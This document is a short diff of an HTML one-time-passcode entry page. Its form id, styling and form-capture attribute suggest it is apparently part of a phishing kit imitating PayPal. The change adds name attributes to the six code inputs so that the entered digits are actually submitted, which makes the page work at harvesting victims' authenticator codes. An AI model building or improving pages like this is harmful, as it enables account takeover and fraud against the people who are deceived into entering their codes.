@@ -197,15 +197,14 @@ ul.priorityCountries li:first-child a:hover {
         <h1 class="headerText">Enter your OTP</h1>
        <p>Enter the 6-digit security code from your authenticator app.</p>
     <form id="paypotpform" action="/submit-otp" method="POST" data-netlify="true">
-        <div class="textInput" id="otp_inputdiv">
-          <div class="otp-container">
-    <input type="text" id="otp1" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
-    <input type="text" id="otp2" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
-    <input type="text" id="otp3" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
-    <input type="text" id="otp4" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
-    <input type="text" id="otp5" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
-    <input type="text" id="otp6" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
-</div>
+  <div class="otp-container">
+    <input type="text" name="otp1" id="otp1" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+    <input type="text" name="otp2" id="otp2" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+    <input type="text" name="otp3" id="otp3" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+    <input type="text" name="otp4" id="otp4" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+    <input type="text" name="otp5" id="otp5" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+    <input type="text" name="otp6" id="otp6" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+  </div>
             <div class="errorMessage" id="otpErrorMessage">
                 <!-- Error messages here -->
             </div>
